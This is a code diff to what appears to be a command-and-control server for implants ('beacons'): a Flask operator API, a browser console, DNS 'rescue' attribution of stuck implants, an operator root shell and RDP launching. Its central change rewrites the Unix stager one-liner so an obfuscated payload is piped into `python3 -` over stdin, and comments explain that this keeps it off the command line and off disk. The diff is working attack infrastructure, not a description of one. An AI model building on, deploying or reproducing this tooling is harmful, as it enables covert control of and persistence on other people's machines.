@@ -615,9 +615,12 @@ def _obfuscate_layer(code: str, var_mod: str) -> str:
     The emitted line binds the decompressed text to the module global
     `_src` before executing it, instead of handing it straight to `exec`.
     That is what lets a running artifact start a second mode of itself:
-    under `python3 -c` there is no file to re-run and `sys.argv[0]` is the
-    literal string "-c", so the only copy of the source is the one the
-    process is holding. `Beacon._exec_tunnel` writes it to a
+    under `printf %s "<stage>" | python3 -` there is no file to re-run and
+    `sys.argv[0]` is the literal string "-" (the Windows one-liner's
+    `python -c` gives "-c"), so the only copy of the source is the one
+    the process is holding. The payload travels on stdin rather than as
+    a `-c` argument because Linux refuses an argv entry over 131072
+    bytes. `Beacon._exec_tunnel` writes it to a
     `python3 -` child on stdin, which keeps the payload off the child's
     command line and off the disk.
 
@@ -1166,6 +1169,11 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
             agent_list.append({**info, "status": status,
                                "caps": info.get("caps") or []})
         return jsonify(agent_list)
+
+    @app.route("/api/rescues/unattributed", methods=["GET"])
+    @require_auth
+    def api_rescues_unattributed():
+        return jsonify({"unattributed": list(reversed(unattributed_rescues))})
 
     @app.route("/api/agents/<agent_id>", methods=["GET"])
     @require_auth
@@ -2585,7 +2593,19 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
             return jsonify({"error": "target required"}), 400
 
         if mode == "xfreerdp":
-            cmd_parts = ["xfreerdp"]
+            # Looked up, not assumed. freerdp2 ships `xfreerdp` and
+            # freerdp3 ships `xfreerdp3`; this used to hardcode the former,
+            # so moving the image's Debian base -- which happened once
+            # already, unnoticed -- would leave the RDP button failing at
+            # runtime for an operator to discover. The VNC branch below
+            # has always probed its viewer names; this now matches it.
+            client = next(
+                (name for name in ("xfreerdp", "xfreerdp3")
+                 if shutil.which(name)), None)
+            if client is None:
+                return jsonify({"error": "No RDP client found (install "
+                                         "freerdp2-x11 or freerdp3-x11)"}), 400
+            cmd_parts = [client]
             cmd_parts.append(f"/v:{target}")
             if port:
                 cmd_parts.append(f"/port:{port}")
@@ -2711,13 +2731,21 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
             })
 
         # Double quotes on both, with single quotes inside the stage
-        # itself: one text that `sh -c`, `cmd.exe` and PowerShell's
-        # `Invoke-Expression` all hand to `-c` as a single argument. The
-        # stage carries no `$`, backtick, backslash or `"`, which is what
-        # makes the double-quoted form safe in all three. See
+        # itself. The stage carries no `$`, backtick, backslash or `"`,
+        # which is what makes the double-quoted form safe in `sh`,
+        # `cmd.exe` and PowerShell's `Invoke-Expression` alike. See
         # `_obfuscate_layer`, and `docs/TUNNEL.md` for why the inline
         # Windows one-liner is undeliverable at this size regardless.
-        oneliner_unix = f'python3 -c "{stage}"'
+        #
+        # The two differ in where the payload goes. Linux refuses any
+        # single argv entry over 131072 bytes (MAX_ARG_STRLEN) and the
+        # stage is larger, so `python3 -c "<stage>"` cannot be exec'd
+        # there. Unix therefore pipes it into python's stdin, through
+        # `printf`, which dash, bash and busybox ash all run as a builtin
+        # so nothing execs the payload; `%s` keeps it out of the format
+        # string. Windows keeps `-c`: its one-liner is only ever run
+        # through `Invoke-Expression`, which has no such limit.
+        oneliner_unix = f'printf %s "{stage}" | python3 -'
         oneliner_win = f'python -c "{stage}"'
         stagers = _stagers_for_build(gen_cfg, drops, oneliner_unix,
                                      oneliner_win)
@@ -3799,12 +3827,55 @@ def _handle_rescue(payload: dict, crypto: ServerCrypto):
         klass, code = record[leg]
         stuck[leg] = [names.get(klass, "unknown"), code]
 
+    def _claim(agent_id, info):
+        info["stuck"] = stuck
+        answer = _handle_beacon({"agent_id": agent_id}, crypto)
+        # After the check-in bookkeeping, not before. `_handle_beacon` sets
+        # `last_channel = "http"` on every call, by design: it means "the
+        # last contact came in over the agent socket", which it cannot tell
+        # apart from the SMB and QUIC relays. A rescue is relayed over that
+        # same socket, so it would be marked "http" -- and this handler's
+        # own `last_channel = "dns"`, written one line earlier, was wiped
+        # out before anyone could read it. The interface then showed "http"
+        # for a beacon whose only working leg was DNS, which is the exact
+        # situation this channel exists for.
+        info["last_channel"] = "dns"
+        return answer
+
+    # Two passes, and the order is the whole design. A fleet name is the
+    # stronger signal -- a beacon can only stamp one if this server told it
+    # that name in a registration reply -- so it is tried across the whole
+    # fleet before any implant id is considered. Two bytes of fingerprint
+    # collide once in 65536, and offering a second candidate per agent
+    # doubles that; when both kinds match, the name wins.
     for agent_id, info in agents.items():
         if dns_rescue.fingerprint(agent_id) == record["fingerprint"]:
-            info["stuck"] = stuck
-            info["last_channel"] = "dns"
-            return _handle_beacon({"agent_id": agent_id}, crypto)
+            return _claim(agent_id, info)
 
+    # The implant id, because a beacon often cannot know its fleet name.
+    # `_agent_id` is set in exactly one place -- the HTTPS registration
+    # reply -- and no other transport sends `action=register`, so a process
+    # whose HTTPS leg was down throughout its life stamps its implant id
+    # instead. That id is stable per host, so the agent record from an
+    # earlier process is still here holding it in `info["id"]`, and the
+    # operator was being told nobody could claim a host the server could
+    # name. `_handle_beacon` and `_handle_register` both already resolve an
+    # implant id this way; this path was the one that did not.
+    #
+    # An empty id identifies nobody: `fingerprint("")` is a fixed value, so
+    # a record carrying no id would otherwise claim every rescue sent by a
+    # beacon that had not yet learned who it was.
+    for agent_id, info in agents.items():
+        implant_id = info.get("id") or ""
+        if (implant_id
+                and dns_rescue.fingerprint(implant_id)
+                == record["fingerprint"]):
+            return _claim(agent_id, info)
+
+    # No agent id here: the record carries a fingerprint and leg codes,
+    # never a string from the target, so the summary is safe to log whole.
+    _log_event("RESCUE", "A stuck beacon nobody can claim (fingerprint "
+               "%04x) says: %s" % (record["fingerprint"], stuck["summary"]))
     unattributed_rescues.append(stuck)
     del unattributed_rescues[:-_RESCUE_UNATTRIBUTED_MAX]
     return _fake_response()
@@ -8434,9 +8505,20 @@ async function opshellPoll(){
     // running. A proxy that accepts and never answers produces no
     // rejection at all, so without this the heartbeat stopped silently and
     // the claim lapsed under a live root shell.
+    //
+    // Used where it exists, skipped where it does not: `AbortSignal.timeout`
+    // is Safari 16, and this page's own baseline is Safari 13.1 -- 164 uses
+    // of optional chaining and the Clipboard API, and nothing newer than
+    // 2020 until this line. Calling it unconditionally threw a TypeError
+    // inside the poll on an older browser, which killed the heartbeat: the
+    // very failure the deadline was added to prevent, by a different door.
+    // Measured: zero polls instead of two.
+    const deadline = typeof AbortSignal !== "undefined"
+      && typeof AbortSignal.timeout === "function"
+      ? AbortSignal.timeout(8000) : undefined;
     state = await fetch("/api/opshell/state"
       + (opshellSession ? "?session=" + encodeURIComponent(opshellSession) : ""),
-      {headers: H(), signal: AbortSignal.timeout(8000)})
+      {headers: H(), signal: deadline})
       .then(r => {
         if(r.status === 401){ tokenRejected(); throw new Error("operator token rejected"); }
         return r.json();
@@ -10789,6 +10871,33 @@ function copyToClipboard(text, label){
   });
 }
 
+// A rescue no beacon can claim is told once, not every tick: the server
+// keeps the last 50 and never clears them, so each is keyed on who sent it
+// and when. Several found in one poll -- a console opened on a server that
+// has been up for a week, or a burst -- are one notification that counts
+// them; the Server Log has each.
+let seenRescues = {};
+async function refreshRescues(){
+  if(!storedToken()) return;
+  const r = await api("/api/rescues/unattributed");
+  // Served newest first; announced oldest first, so the newest ends on top.
+  const fresh = (r.unattributed || []).slice().reverse().filter(rec => {
+    const key = rec.fingerprint+"@"+rec.at;
+    if(seenRescues[key]) return false;
+    seenRescues[key] = true;
+    return true;
+  });
+  if(fresh.length > 1){
+    toast("warning", fresh.length+" Unknown Beacons Are Stuck",
+      fresh.length+" stuck beacons match no agent<br>Each is in the Server Log", 10000);
+  } else if(fresh.length === 1){
+    const rec = fresh[0];
+    const fp = ("0000"+(rec.fingerprint|0).toString(16)).slice(-4);
+    toast("warning", "Unknown Beacon Is Stuck",
+      "fingerprint "+esc(fp)+" matches no agent<br>"+esc(rec.summary), 10000);
+  }
+}
+
 // A closed tab is one of the two ordinary ways of leaving the operator
 // shell, and it sends no click. `pagehide` rather than `beforeunload`:
 // that one is not fired reliably for a tab the browser discards, and this
@@ -10800,8 +10909,10 @@ window.addEventListener("pagehide", () => { opshellEndSession(); });
 
 if(storedToken()){
   setInterval(refreshAgents, 3000);
+  setInterval(refreshRescues, 3000);
   setInterval(checkTaskResults, 2500);
   refreshAgents();
+  refreshRescues();
   toast("info","Server Online","Listening for beacon connections<br>Beacon traffic accepted on any POST path",6000);
 } else {
   askForToken(false);
